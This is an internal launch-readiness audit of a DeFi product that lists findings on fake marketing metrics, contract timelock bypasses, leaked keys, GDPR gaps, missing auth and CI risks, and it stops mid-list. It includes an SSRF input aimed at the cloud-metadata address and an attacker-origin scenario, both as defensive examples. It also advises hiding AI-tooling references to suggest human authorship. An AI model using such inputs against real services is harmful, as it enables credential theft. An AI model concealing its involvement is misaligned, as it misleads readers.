# Atrium Full Launch-Readiness Audit — 2026-05-28

This is the consolidated launch-readiness audit. It supersedes every prior audit doc for the 2026-05-28 cycle. It is the single source of truth for what is broken, what is faked, what is missing, and what is good.

## Method

- **Wave 0** — original 10-subagent first pass. 69 findings. Preserved here as `O-N`.
- **Wave 1** — 5 parallel subagents on web security, live verification, accessibility/perf/SEO, wallet/tx/network UX, launch-readiness/legal/brand. 179 findings.
- **Wave 2** — 5 parallel subagents on PRD-vs-built fit, resources/ cross-reference, contracts deep re-review, subgraph reliability, end-to-end user journeys. 219 findings.
- **Total raw:** 467 findings. **Deduplicated unique:** 312 actionable items + 28 PASS confirmations.

## Coverage

- `apps/verify/*` — 42 page routes, 200+ components, 45+ API routes, mobile + desktop trees.
- `contracts/*` — 4 Stylus contracts (Plinth, Coffer, Sigil, Vigil), 25+ Solidity contracts (adapters, Aqueduct family, Postern family, registries, timelock).
- `services/*` — codex, lantern-attestor, vigil-keeper, notifier, tablet, agents, archive, praetor-cli.
- `subgraph/*` — schema.graphql, 15 handler files, 15 ABIs.
- `.github/workflows/*` — all 9 workflows.
- `docs/*`, README, SECURITY, CONTRIBUTING, runbooks, incidents, audits, rehearsals.
- `design/*` HTML prototypes + extracted tokens.
- `resources/*` reference repos cross-checked: stylus-sdk-rs, rust-contracts-stylus, openzeppelin-contracts, aave-v3-core, pendle-core-v2-public, hyperliquid-contracts, hyper-evm-sync, chainlink-brownie-contracts, pyth-crosschain, account-abstraction, erc-8004-contracts, x402, graph-tooling, halmos, arbitrum-docs, arbitrum-sdk.

## Standards applied

CLAUDE.md (no compromise; the design HTML is the product UI contract; best product option always) · `docs/conventions/{ui,security,writing,testing}.md` · WCAG 2.1 AA · GDPR / CCPA / EU ePrivacy · ERC-4626, ERC-7201, ERC-8004, ERC-4337, EIP-712 · CCIP best practices · OWASP top 10 · OZ ReentrancyGuard / Ownable2Step / UUPS conventions.

---

## ⚖️ Executive Verdict

**State of product:** ~14 of 18 subsystems deployed on Arbitrum Sepolia with varying functionality. Closer to the PRD's FLOOR scenario (13/18) than the REALISTIC scenario (17/18). Marketing copy implies REALISTIC in several places. The on-chain contracts are largely solid (high-quality core math, reentrancy guards, dual-oracle hardening). The primary weaknesses are at the seams: frontend-vs-truth gaps, half-disclosed mocks, missing operational hygiene (CSP, GDPR consent, error boundary, auth on internal routes), and a verifier demo that does not currently walk end-to-end.

**Top-10 launch blockers (sequenced):**

1. Mobile + desktop landing both render fabricated metrics. The honesty page claims they were removed; they were not. (C-001, C-002, C-003)
2. Verifier-mode steps 2, 3, 5 throw on click. The judge demo cannot complete. (C-004)
3. CCIP `Aqueduct.resume()` bypasses the 48-hour timelock. (C-005)
4. PlinthMath returns zero on array mismatch instead of reverting → unlimited leverage. (C-006)
5. `.env` on disk holds real Cloudflare token + Graph Studio key + deployer key. Not rotated since the May 24 incident. (C-007)
6. Notifier service is entirely non-functional: queries non-existent fields and uses wrong enum values. (C-008, C-009)
7. Sentry fires without consent banner; privacy policy never discloses Sentry. (C-010, C-011)
8. Privacy policy and terms are templated boilerplate, not finance-grade legal text. (C-012)
9. Eight named partners on the landing trust strip have not signed; manifesto explicitly bans this. (C-013)
10. Kill switch is inaccessible on mobile despite being one of the five required mobile flows. (C-014)

**What is good (do not regress):**
- Reentrancy guards consistently applied across all state-changing functions.
- Dual-oracle hardening (negative-price guard, staleness, disagreement) is thorough.
- ERC-4626 inflation attack mitigated via virtual-shares offset.
- Coverage of access control patterns: multisig + 48h timelock, with separate emergency pause.
- 589/589 vitest tests pass; 30+ Foundry test suites green.
- Per-block notional cap on adapters limits a compromised adapter to 1% of TVL per block.
- x402 payment verification is stricter than the upstream reference (12 confirmations + on-chain log decode + replay dedup).
- Empty states correctly distinguish "data unavailable" from "measured zero" in 8+ components.
- All numeric formatting is BigInt-native; no precision loss in money math.
- Onboarding correctly discloses unwired contracts as "pending" with named blockers.

**Brutal one-paragraph verdict:** Atrium has the bones of a serious cross-venue prime brokerage product on Arbitrum Sepolia. The Stylus core, Solidity adapters, formal-verification scaffolding, and design system are real, deliberate, and audit-defensible. The frontend is two codebases stapled together — a solid API-driven implementation alongside an unscrubbed Lovable-port set of mocks that lie about TVL, agents, partners, and reserves. The honesty page itself lies. Five of the seven verifier-demo steps work; two are critical (deposit, kill switch), and the other three (open, recompute, liquidate) throw. Two web-security gaps (no CSP, no global error boundary), two GDPR gaps (Sentry without consent, templated privacy policy), and one notifier service that cannot deliver any alert because of two separate field-name mismatches stand between this product and a clean public demo. None of these are deep architectural problems. Most are surface-level fixes that a focused 5–10 day sprint can clear. The deeper items — Stylus contracts not in the deployment.md status table, agents that are stubs, adapter conformance tests that do not exist, status page absent — are real but tractable. The product is one disciplined sprint away from being legitimately launch-ready.

---

## Severity ladder (definitions)

- **🔴 CRITICAL** — fix before any public demo. Either a security exposure, a fabrication a judge will catch, or a flow that is fundamentally broken.
- **🟠 HIGH** — fix before testnet submission. Real bug, real legal/regulatory gap, or real UX dead-end on a primary path.
- **🟡 MEDIUM** — fix before mainnet flip / before serious-product launch. Quality, polish, completeness, professionalism.
- **🟢 LOW** — nice to fix. Inconsistency, minor convenience, micro-optimization.
- **✅ PASS** — verified correct; do not regress.

Each finding shows: source audit reference, file/line evidence, root cause, impact, recommended fix, effort estimate (S = under 1h, M = 1–8h, L = >8h).

---

# 🔴 CRITICAL — fix before any public demo

### C-001 · Desktop landing renders fabricated TVL/agents/queries via `Numbers.tsx`
**Area:** Frontend / Honesty · **Source:** wave1-live-verify LV-04, wave1-launch L-3, wave2-product P-1
**Evidence:** `apps/verify/src/components/atrium/landing/Numbers.tsx:9-10` — `useState(4.13)` for TVL, `useState(42109)` for queries, `const agents = 37`, plus a `setInterval` that randomly increments these to simulate a live counter.
**Root cause:** Lovable-port component imported on desktop landing alongside the honest `NumbersSection` (which fetches `/api/protocol/metrics`).
**Impact:** Direct violation of CLAUDE.md ("Never ship the prototype numbers as truth") and `writing.md` claims discipline. Investors and judges see fabricated metrics on the primary marketing page.
**Fix:** Delete `Numbers.tsx`. Replace the import with `NumbersSection`. The desktop landing page already has the honest component path wired.
**Effort:** S (15 min)

### C-002 · Mobile landing renders every fake stat from the prototype
**Area:** Frontend / Honesty · **Source:** O-2, wave1-live-verify LV-05, wave2-product P-2
**Evidence:** `apps/verify/src/components/atrium/mobile/MobileLanding.tsx`:
- L83–91: venue cards with hardcoded `$1.25M`, `$892K`, `$401K`, `$320K`, `$483K`, `$186K`
- L123: `$12,374,820` buying power
- L124–126: `$4.13M` collateral, `3.0×` margin, `38.4%` utilization
- L215–218: `$4.13M` TVL, `37` agents, `42K` queries, `7 / 8` venues
- L228: "Thirteen ship at launch"
- L246: hardcoded partner array `["Pendle", "Variational", "Horizen", "IOSG", "Hyperliquid", "Aave Labs"]`
- L257: "Faucet drops $10K test USDC + $5K rAAPL" (real faucet drops 5 USDC + 0.0005 ETH)

**Root cause:** Mobile component never refactored to use `/api/protocol/metrics` like the desktop counterpart.
**Impact:** Mobile is 60%+ of crypto traffic. Every mobile visitor sees fabricated metrics.
**Fix:** Rewrite to use the same API hooks as desktop, OR delete the file and let the responsive desktop layout serve mobile.
**Effort:** M (2–4h)

### C-003 · Honesty page falsely claims the mobile fake numbers were removed
**Area:** Frontend / Honesty · **Source:** wave1-live-verify LV-19, wave2-product P-15, wave2-e2e E2E-24
**Evidence:** `apps/verify/src/app/docs/honesty/page.tsx:113` — "Per the 2026-05-25 audit, the mobile-landing was previously flashing `$12.37M` / `$4.13M` etc. before hydration; that has been removed." `MobileLanding.tsx` still has every one of those values.
**Root cause:** Honesty disclosure was written aspirationally and never verified against the code.
**Impact:** The one surface that is supposed to be the source of truth for what is real is itself dishonest. A judge cross-referencing kills credibility instantly.
**Fix:** Either fix `MobileLanding.tsx` (then the disclosure becomes true), or update the disclosure to say the fake stats still exist with a timeline for removal.
**Effort:** S (15 min for disclosure) or M (4h with C-002)

### C-004 · Verifier-mode steps 2, 3, 5 throw on click
**Area:** Verifier / Demo · **Source:** wave2-product P-4, wave2-e2e E2E-01, E2E-40
**Evidence:** `apps/verify/src/components/verifier-step-runner.tsx:145-148` — `case 'plinth-open-position': case 'plinth-recompute-margin': case 'vigil-liquidate': throw new Error(config.pendingReason);`
**Root cause:** The action kinds for steps 2 (open position), 3 (margin recompute), 5 (liquidation drill) are not wired. The pending banner appears only when `deploymentReady === false`; if the user navigates directly to the step the throw fires.
**Impact:** The 7-step verifier flow is the primary judge demo per PRD §26.1. Today only 4 of 7 steps walk. Acceptance-criteria gate #6 ("all 7 steps walk end-to-end") cannot pass. The judge runbook beat-by-beat description of "Two parallel positions. Long on Trade.xyz, short on Hyperliquid" is fiction.
**Fix:** Either (a) wire the three action kinds via AtriumRouter + Plinth + Vigil and complete the demo, or (b) gate every step with a deployment-ready check that surfaces a clean honest-pending banner instead of throwing. Path (a) is the right fix; path (b) is the same-week mitigation.
**Effort:** L (30–50h for full wiring) or M (2h for honest-pending mitigation)

### C-005 · `Aqueduct.resume()` is `onlyPraetor`, bypassing the 48-hour timelock
**Area:** Contracts / Praetor · **Source:** O-13, wave2-contracts W2-C2
**Evidence:** `contracts/aqueduct/src/Aqueduct.sol:143` — `function resume() external onlyPraetor`
**Root cause:** Sole contract whose `resume()` is multisig-only. Every other contract uses `onlyTimelock`.
**Impact:** A compromised Praetor key (the deployer EOA today) can pause Aqueduct, drain via CCIP, then resume in one block. The timelock veto window that protects every other subsystem does not protect cross-chain transfers.
**Fix:** Change to `onlyTimelock`. Redeploy or upgrade Aqueduct.
**Effort:** S (1-line code change) + M (redeploy / upgrade procedure)

### C-006 · `PlinthMath.required_margin()` returns zero on array length mismatch instead of reverting
**Area:** Contracts / Math · **Source:** O-3, wave2-contracts W2-C1
**Evidence:** `contracts/plinth-math/src/lib.rs:62-71` — guard returns `U256::ZERO` instead of panicking. The Plinth wrapper's `map_err → ERR_MATH_UNREACHABLE` only catches a full staticcall revert, not a successful zero return.
**Root cause:** Defensive coding chose silent-zero over revert.
**Impact:** If Plinth ever passes mismatched arrays (storage race during liquidation, malformed config), the user gets `required_margin = 0` → unlimited leverage until the next update.
**Fix:** Replace the early-return with `panic!` or a `sol!`-defined revert. Plinth's existing error mapping then surfaces `ERR_MATH_UNREACHABLE` correctly.
**Effort:** S (1-line) + redeploy PlinthMath

### C-007 · `.env` on disk holds real Cloudflare + Graph Studio + deployer keys; not rotated since incident
**Area:** Security / Secret hygiene · **Source:** O-1, O-25, wave1-websec F16, incidents/2026-05-24-deployer-key-leaked-to-local-temp-log.md
**Evidence:** `.env` (gitignored, on local disk) contains active Cloudflare API token, The Graph Studio deploy key, deployer EOA private key, multiple cron secrets. The May 24 deployer-key incident's required-follow-up checklist has every item unchecked four days later.
**Root cause:** Manual rotation tasks never completed.
**Impact:** Local-machine compromise or accidental commit (which already happened on May 24 to a temp log) leaks production-equivalent testnet keys. The leaked deployer key still controls admin rights on every Stylus contract.
**Fix:** Rotate every secret in `.env` immediately. Generate new deployer EOA. Transfer admin via PraetorTimelock. Rotate Cloudflare token, Graph deploy key, all cron tokens. Move secrets to a vault (1Password, Bitwarden, HashiCorp Vault free tier). Check the boxes in the incident doc.
**Effort:** L (full rotation + verify). Critical because already overdue.

### C-008 · Notifier queries non-existent subgraph fields — every tick silently fails
**Area:** Backend / Subgraph · **Source:** wave2-subgraph SD-1
**Evidence:** `services/notifier/src/tick.ts:79-95` — GraphQL query requests `txHash` on `liquidationEvents`, `alertEvents`, and `sigilRevocations`. None of these entities define `txHash`. Also queries `detail` on `alertEvents` (not in schema) and `user` on `liquidationEvents` (the field is `account`, typed as a nullable FK, not a Bytes address).
**Root cause:** Notifier was written against a planned schema shape that never shipped. No integration test validates the query against the live schema.
**Impact:** Every tick's `gql()` returns a GraphQL error. The catch returns. Zero notifications ever deliver. Liquidation alerts, oracle disagreements, and mandate revocations are dead letter despite a 1-minute cron.
**Fix:** Align query field names with the actual schema. For `txHash`, immutable entities use `id = txHash + '-' + logIndex` — extract it from the id, or add `txHash: Bytes!` to the relevant entities.
**Effort:** M (2h)

### C-009 · Notifier `mapAlertKind` uses SCREAMING_SNAKE; handlers write lowercase
**Area:** Backend / Subgraph · **Source:** wave2-subgraph SD-2
**Evidence:** `services/notifier/src/tick.ts:131-140` switches on `'ORACLE_DISAGREEMENT'`, `'PLINTH_PAUSED'`, etc. The actual `AlertEvent.kind` values written by handlers are lowercase: `'oracle_disagreement'`, `'vigil_queue_failed'`, `'link_balance_low'`, etc.
**Root cause:** Convention mismatch between draft notifier code and the handlers that shipped.
**Impact:** Even if C-008 were fixed, every alert falls through to the `default: return null` branch and is skipped. Combined with C-008, the notifier service is fully non-functional.
**Fix:** Change switch cases to match the actual handler-written values. Add a snapshot test that asserts the set of valid kinds matches the handler output.
**Effort:** S (30 min)

### C-010 · Sentry fires without consent or disclosure (GDPR violation)
**Area:** Security / Legal · **Source:** wave1-websec F5, wave1-launch L-2
**Evidence:** `apps/verify/sentry.client.config.ts:9` — `Sentry.init()` runs unconditionally on page load. `apps/verify/src/app/legal/privacy/page.tsx` mentions only "Vercel Web Analytics with cookie-free measurement" and never mentions Sentry.
**Root cause:** No consent banner. Sentry sets cookies + transmits device/browser fingerprint + URLs (which contain wallet addresses) to a US processor without prior consent.
**Impact:** GDPR Article 6 + ePrivacy Directive violation for EU visitors. CCPA opt-out missing for US visitors. Fines up to 4% of turnover. Wallet addresses leaked to a third party as pseudonymous PII.
**Fix:** Implement a minimal consent banner that gates Sentry init. Add Sentry to the privacy policy with sub-processor disclosure. Add a `beforeSend` PII scrubber that redacts `0x[a-f0-9]{40}` in error messages, URLs, breadcrumbs.
**Effort:** M (3–4h banner + 30min scrubber)

### C-011 · Sentry `replaysOnErrorSampleRate: 1.0` captures full DOM replay without consent
**Area:** Security / Legal · **Source:** wave1-websec F22
**Evidence:** `apps/verify/sentry.client.config.ts:18` — Session Replay records DOM mutations, mouse, keystrokes on every error. Combined with C-010, every error event captures the user's screen including wallet addresses and form input.
**Root cause:** Replay enabled at 1.0 sample with no consent gate.
**Impact:** Full screen + interaction recording sent to Sentry on every JS error. Unambiguous GDPR data-processing violation.
**Fix:** Set sample rate to 0 until consent is granted. Add `maskAllText: true` and `blockAllMedia: true` to the replay integration as defense-in-depth.
**Effort:** S (10 min code change)

### C-012 · Privacy policy and terms are templated boilerplate, not finance-grade legal text
**Area:** Legal / Compliance · **Source:** wave1-launch L-1, L-4
**Evidence:** `apps/verify/src/app/legal/privacy/page.tsx` — discloses wallet data and Vercel analytics but omits: data retention periods (beyond Codex 24h), GDPR user rights (access, rectification, erasure, portability), CCPA opt-out, DPO contact, processing location, lawful basis, Sentry disclosure, sub-processor list. `apps/verify/src/app/legal/terms/page.tsx` — covers testnet-only and no-warranty but omits: governing law, dispute resolution, eligibility, excluded jurisdictions (OFAC), limitation of liability, indemnification, class-action waiver.
**Root cause:** Pages were created to satisfy "do legal pages exist" without lawyer review.
**Impact:** Non-compliant with GDPR Art. 13/14 and CCPA §1798.100. Terms unenforceable in most jurisdictions. For a finance product targeting UK/US/DE users (Tablet supports all three), this is a structural legal risk.
**Fix:** Engage a privacy lawyer to draft a compliant privacy policy. Add governing law (Cayman/BVI/Delaware are common), arbitration clause, eligibility section referencing Edict tiers, limitation of liability. Until lawyer review lands, gate the app behind a click-through that says "testnet only, no real funds, you accept that you may lose access at any time."
**Effort:** L (4–8h legal review + drafting)

### C-013 · Landing trust strip lists 8 unsigned partners (Pendle, Hyperliquid, Aave Labs, Coinbase, etc.)
**Area:** Frontend / Honesty / Legal · **Source:** wave1-live-verify LV-06, wave2-product P-3
**Evidence:** `apps/verify/src/lib/atrium/mock.ts:119` — `PARTNERS = ["Pendle Labs", "Variational", "Horizen", "IOSG", "Robinhood Chain", "Hyperliquid", "Aave Labs", "Coinbase"]`. Used in `page.tsx:280`. `docs/deployment.md` says "Cohort partner outreach (zero today)." Honesty page says "No partner logos render on the cohort strip."
**Root cause:** Prototype partner names carried over without consent verification.
**Impact:** Direct violation of CLAUDE.md ("Never invent a number, partner, mentor, or relationship"). Judges who check `/cohort` (honest empty state) vs landing (8 logos) see a contradiction. Trademark / commercial-misrepresentation exposure if any named company objects.
**Fix:** Replace the `PARTNERS` array with an empty array, fetch from `/api/cohort/partners` (which today returns empty), and show "Building on" with technology names (Arbitrum, Chainlink, ERC-4337) instead of company logos.
**Effort:** S (15 min)

### C-014 · Kill Switch is inaccessible on mobile despite being a required mobile flow
**Area:** UI / Mobile · **Source:** O-24, wave2-e2e E2E-34
**Evidence:** Kill switch surfaces:
- `/verify/7` (works, deployment-gated)
- Desktop topbar `AppShellActions` (works)
- Mobile: nowhere. `SettingsMobile`, `AgentsMobile`, `MobileApp` Lovable port — none have a kill-switch row.

`docs/conventions/ui.md` lists Kill Switch as one of the 5 required mobile flows.
**Root cause:** Kill switch implemented as a desktop-topbar element; mobile pivot never added it.
**Impact:** A panicking user on mobile cannot revoke mandates. The very feature designed for emergencies is unavailable in the most common emergency-use device.
**Fix:** Add a kill switch row to `SettingsMobile` and a persistent FAB (or "More" tab item) on the mobile shell. Use the existing `useKillSwitch` hook.
**Effort:** M (3–4h)

### C-015 · `.dockerignore` excludes `agents/` and `services/` but Dockerfile COPYs from those dirs
**Area:** CI/CD · **Source:** O-4
**Evidence:** `.dockerignore` excludes `agents/` and `services/`. The `agents/Dockerfile` and `services/*` Dockerfiles `COPY` from those paths.
**Root cause:** Misconfigured docker-ignore.
**Impact:** Docker build from repo root context fails. Anyone trying to deploy agents or services via Docker hits an immediate failure.
**Fix:** Remove `agents/` and `services/` from `.dockerignore`, OR restructure the build context to point at those directories specifically.
**Effort:** S (5 min)

### C-016 · `.gitignore` and `CONTRIBUTING.md` reveal AI tooling to public viewers
**Area:** Docs / Professionalism · **Source:** O-5, O-6
**Evidence:** `.gitignore` contains comments naming "CLAUDE.md", "AI-assistant working directory", "AI-assisted dev workflow". `CONTRIBUTING.md` (line 47, original) said "Never add Co-authored-by: Claude" — already partially addressed but verify the rephrase landed in `docs/conventions/git.md` too.
**Root cause:** Comments written for internal team without considering public visibility.
**Impact:** A judge or investor browsing the repo sees explicit AI-tooling references on a tracked file. Reduces perception of human authorship.
**Fix:** Strip or genericize: replace "CLAUDE.md / AI assistant" comments with "internal tooling config." Verify `docs/conventions/git.md` uses generic phrasing.
**Effort:** S (15 min)

### C-017 · `deployment.md` status table contradicts `deployments/arbitrum_sepolia.json`
**Area:** Docs / Live verification · **Source:** wave1-live-verify LV-01, wave1-live-verify LV-02, LV-03, wave2-product P-5
**Evidence:**
- `docs/deployment.md:28-29` claims "Stylus contracts (Coffer, Plinth, Sigil, Vigil) | 0 / 4 | BLOCKED" and "Stylus-dependent Solidity (Aqueduct, Router, Postern, Rostrum) | 0 / 5 | Blocked".
- `deployments/arbitrum_sepolia.json` has deployed addresses for all 9 (coffer, sigil, vigil, plinth, aqueduct, atrium-router, postern-kill-switch, rostrum, plus more).
- `deployment.md:46` lists lantern-attestor as `0x900a9fb4bab7576fc11e4bb3c002d89dbe261168` — that's the v1 address marked DEPRECATED in the JSON. The v2 lantern is `0xF0B90b94C0B8a52c545768bFf06a3932c67d5888`.
- `deployment.md` lists 7 contracts in its address table; the JSON has 30+.

**Root cause:** Status table written before deploy and never updated.
**Impact:** Any reader (judge, partner, investor) reading deployment.md concludes the system is undeployed and the lantern address is stale. Single biggest documentation accuracy gap.
**Fix:** Regenerate the status table and address table directly from `deployments/arbitrum_sepolia.json` via a script. Add a CI check that fails if `deployment.md` and the JSON disagree.
**Effort:** M (1h regen + 1h CI gate)

### C-018 · `docs/ROADMAP.md` referenced 20+ times but does not exist
**Area:** Docs · **Source:** wave1-live-verify LV-11
**Evidence:** `SECURITY.md:29`, `verifier-step-config.ts`, the /docs page, plus 15+ frontend files reference "per docs/ROADMAP.md" or link to its GitHub URL. The file is gitignored (`.gitignore:124`) and absent from the working tree.
**Root cause:** Roadmap was internal-only; references to it leaked into public files.
**Impact:** Every "per docs/ROADMAP.md" reference is a broken link. The /docs page links to a 404. SECURITY.md cites it as the source-of-truth for timeline claims.
**Fix:** Either (a) publish the roadmap (remove from `.gitignore`), or (b) replace every reference with a public alternative ("see the changelog" or "see the architecture doc"). Option (a) is preferred.
**Effort:** M (2h to clean up + publish)

### C-019 · `docs/AUDIT_FINDINGS.md` referenced in `JUDGE_ONE_PAGER.md` and frontend; does not exist
**Area:** Docs · **Source:** wave1-live-verify LV-10, LV-18
**Evidence:** `JUDGE_ONE_PAGER.md:53` — "Build state below mirrors `docs/AUDIT_FINDINGS.md` (83 patches landed at Day -7)." The file is gitignored. Multiple frontend components reference it (`audit-findings-table.tsx`, `/api/audit-findings` route, /docs page). The API route returns 404 or empty.
**Root cause:** Same as C-018.
**Impact:** A judge clicking through to verify the "94 patches landed" claim finds nothing. The JUDGE_ONE_PAGER's closing claim "no number on this page is invented" is undermined.
**Fix:** Either publish the audit-findings doc (preferred) or remove all references from public files.
**Effort:** M (2h)

### C-020 · All live URLs in `deployment.md` are unreachable to external visitors
**Area:** Live verification · **Source:** wave1-live-verify LV-12
**Evidence:** Every URL tested:
- `verify.atrium.fi` → HTTP 403 (Vercel auth wall)
- `tablet-staging.atrium.fi`, `codex-staging.atrium.fi`, `lantern-staging.atrium.fi`, `verify-staging.atrium.fi` → DNS resolution failure

README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A judge visiting gets 403.
**Root cause:** Vercel deployment-protection auth wall is enabled on the production project. DNS for staging subdomains never set up.
**Impact:** No external visitor can access the live demo. The judge runbook gate #9 ("verify.atrium.fi resolves") fails.
**Fix:** Disable Vercel deployment-protection on the production verify.atrium.fi project. Verify via curl that the URL returns 200.
**Effort:** S (5 min toggle in Vercel dashboard)

### C-021 · `subgraph-deploy.sh` reads from non-existent `deploy/arbitrum-sepolia.json`
**Area:** Subgraph / Deploy · **Source:** wave2-subgraph SD-8
**Evidence:** `scripts/subgraph-deploy.sh:37` — `DEPLOY_FILE="deploy/arbitrum-sepolia.json"`. The actual registry is at `deployments/arbitrum_sepolia.json` (different directory, different separator). Running the script exits immediately with "ERROR: deploy/arbitrum-sepolia.json not found."
**Root cause:** Bash script written against an earlier directory layout; never updated when the registry moved.
**Impact:** The documented subgraph deploy path is broken. A deploy under time pressure (incident response, urgent schema fix) fails at the first step.
**Fix:** Change `DEPLOY_FILE` to `deployments/arbitrum_sepolia.json`. Or replace the inline Python patcher with `node scripts/update-subgraph-addresses.mjs` (which already reads the correct path).
**Effort:** S (15 min)

### C-022 · `loadtest-nightly.yml` and `ci.yml` (kani job) push directly to master
**Area:** CI/CD / Security · **Source:** O-11 (loadtest), wave1-websec F12, F29, F30
**Evidence:**
- `.github/workflows/loadtest-nightly.yml:55-61` — `git push` directly to master from the workflow bot.
- `.github/workflows/ci.yml:85,119` — kani job has `permissions: contents: write` and `git push || true` directly to main.
- `.github/workflows/brand-assets.yml:26` — same pattern with auto-commit-action.

**Root cause:** Commit-back patterns to bypass humans. `|| true` suppresses push failures silently.
**Impact:** A compromised step (malicious cargo dep pulled during `cargo install kani-verifier`, malicious Python dep in loadtest, etc.) can push arbitrary code to main without review. Branch protection is bypassed.
**Fix:** Push to a dedicated `ci/data` branch and merge via auto-PR. Or use a GitHub App with scoped path permissions. Remove `contents: write` from the kani job.
**Effort:** M (2–4h)

### C-023 · Tablet tax service has zero authentication
**Area:** Backend / Auth · **Source:** O-7, wave2-product P-10
**Evidence:** `services/tablet/` (FastAPI) — no auth middleware. The `/api/tax/export` route on the verify-app proxies to it without auth.
**Root cause:** Demo wallet pattern; auth deferred.
**Impact:** Anyone can export any wallet's tax data by passing `?wallet=`. Information disclosure of full financial history (positions, P&L, deposits, withdrawals) for any address.
**Fix:** Add Bearer-token auth or SIWE session check. Same pattern the notifier uses. Until shipped, restrict `?wallet=` to `DEMO_WALLET_ADDRESS` env fallback only.
**Effort:** M (4h)

### C-024 · Notifier `customWebhookUrl` SSRF — no URL validation
**Area:** Backend / Security · **Source:** O-8
**Evidence:** Notifier `services/notifier/src/tick.ts` (and `/api/settings/notifications` route) accepts a user-supplied `customWebhookUrl` with no URL validation.
**Root cause:** No validation layer.
**Impact:** Server-side request forgery: user submits `http://169.254.169.254/...` (cloud metadata) or internal IP and the notifier hits it.
**Fix:** Validate URL: require HTTPS only, reject private IP ranges (10.x, 172.16–31.x, 192.168.x, 169.254.x), reject `localhost`. Resolve DNS first then re-check the resolved IP is public.
**Effort:** S (1h)

### C-025 · Chaos `inject` route accepts any `*.vercel.app` origin
**Area:** Backend / Security · **Source:** wave1-websec F6
**Evidence:** `apps/verify/src/app/api/chaos/inject/route.ts:85` — `if (origin.endsWith('.vercel.app')) return true;`
**Root cause:** Wildcard match intended for Atrium preview deploys also matches any other Vercel project.
**Impact:** An attacker deploys a malicious page on their own Vercel project (e.g. `evil-xyz.vercel.app`), and the browser fetch succeeds origin-check. They can pause Plinth on Sepolia. Per-IP rate limit slows but does not prevent.
**Fix:** Replace wildcard with project-scoped prefix: `^https:\/\/atrium-verify-[a-z0-9]+-[a-z0-9-]+\.vercel\.app$` plus `*.atrium.fi`. Or read an env var `ALLOWED_PREVIEW_PREFIX`.
**Effort:** S (15 min)

---



# 🟠 HIGH — fix before testnet submission

## Security · HTTP / CSP / headers / auth

### H-001 · No Content-Security-Policy header
**Source:** wave1-websec F1 · **File:** `apps/verify/next.config.mjs:37-44`
**Impact:** XSS payloads execute without browser-level mitigation. Inline scripts and external origins (Sentry tunnel, wagmi RPC, Google Fonts) are unconstrained.
**Fix:** Add CSP directive covering: `default-src 'self'; script-src 'self' 'unsafe-inline' (until favicon script gets a nonce); style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'self' https://*.sentry.io https://*.publicnode.com wss://relay.walletconnect.com https://*.walletconnect.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests`. Tighten `'unsafe-inline'` once the favicon script gets a nonce.
**Effort:** M (2–3h)

### H-002 · No Strict-Transport-Security header
**Source:** wave1-websec F2 · **File:** `apps/verify/next.config.mjs:37-44`
**Impact:** First-visit HTTP downgrade vector. Browsers do not enforce HTTPS for the domain.
**Fix:** Add `{ key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' }`. Submit `verify.atrium.fi` to hstspreload.org once stable.
**Effort:** S (5 min)

### H-003 · No global error boundary
**Source:** wave1-websec F4 · **Files missing:** `apps/verify/src/app/error.tsx`, `global-error.tsx`
**Impact:** Unhandled runtime errors render Next.js's default error page (white screen in production, stack trace in dev). Sentry catches the event but the user sees a broken app.
**Fix:** Create `app/global-error.tsx` with a styled fallback UI calling `Sentry.captureException` and a "Try again" button using `reset`.
**Effort:** S (30 min)

### H-004 · Portfolio / tax / transfer / notifications / mandates API routes have no auth
**Source:** wave1-websec F8 · **Files:** `apps/verify/src/app/api/portfolio/{positions,summary,buying-power,margin-health,activity}/route.ts`, `api/notifications/route.ts`, `api/agents/my-mandates/route.ts`, `api/tax/*`, `api/transfer/*`
**Impact:** Any visitor passes `?wallet=` and reads any wallet's positions, margin, tax events, mandates. Information disclosure of financial state for arbitrary addresses.
**Fix:** Until SIWE session auth ships, scope the routes to `DEMO_WALLET_ADDRESS` env fallback only. Or require a Bearer token signed by the wallet (challenge-response).
**Effort:** M (4–6h shipping SIWE; S 30min for demo-wallet-only mitigation)

### H-005 · `connected-sites` route has no auth — anyone can POST/DELETE sessions
**Source:** wave1-websec F18 · **File:** `apps/verify/src/app/api/settings/connected-sites/route.ts`
**Impact:** Any visitor can register fake connected-dapp entries (UI confusion) or DELETE all (denial of service). The in-memory Map is shared across callers.
**Fix:** Apply the same `requireBearer` pattern used by `settings/notifications`.
**Effort:** S (15 min)

### H-006 · `issue-mandate` route has no Origin / CSRF check
**Source:** wave1-websec F9 · **File:** `apps/verify/src/app/api/agents/issue-mandate/route.ts`
**Impact:** A malicious page can POST to this route cross-origin if the user's wallet is connected. The signature gate provides indirect protection but the legacy unsigned path still accepts the request.
**Fix:** Add Origin allow-list (`verify.atrium.fi`, `localhost:3000`). Remove the legacy unsigned path so signature is mandatory.
**Effort:** S (30 min)

### H-007 · CI actions pinned by tag, not SHA
**Source:** wave1-websec F10 · **Files:** All 9 `.github/workflows/*.yml`
**Impact:** Tags are mutable. A compromised upstream can move a tag to a malicious commit, exfiltrating `KEEPER_PRIVATE_KEY`, `LANTERN_SIGNER_KEY`, `RESEARCH_SIGNER_KEY`, etc. from workflow env.
**Fix:** Pin every action to its current commit SHA. Run `npx pin-github-action .github/workflows/*.yml` to automate.
**Effort:** S (30 min)

### H-008 · Vercel preview URLs inherit production secrets
**Source:** wave1-websec F28 · **Configuration issue**
**Impact:** Every PR-branch preview URL has full access to production env vars (CHAOS_PRIVATE_KEY, PRAETOR_MULTISIG_KEY, KEEPER_PRIVATE_KEY, SUMSUB_WEBHOOK_SECRET, ATRIUM_INTERNAL_KEY). The chaos route's `*.vercel.app` allow-list (C-025) compounds this.
**Fix:** In Vercel project settings: scope all sensitive env vars to "Production" only. Set preview-only env vars to dummy values. Enable Vercel deployment-protection (password or team-only) for preview URLs.
**Effort:** M (1h scoping + verifying)

### H-009 · No rate limiting on 90% of API routes
**Source:** O-53, wave1-websec F25 · **Files:** All routes under `apps/verify/src/app/api/portfolio/*`, `tax/*`, `transfer/*`, `cohort/*`, `lantern/*`, `reserves/*`, `agents/*`, `notifications/*`, `loadtest/*`. Only `chaos/*` has per-IP throttling.
**Impact:** An attacker floods the routes, exhausting Scribe + RPC free-tier quotas. Service degrades for all users.
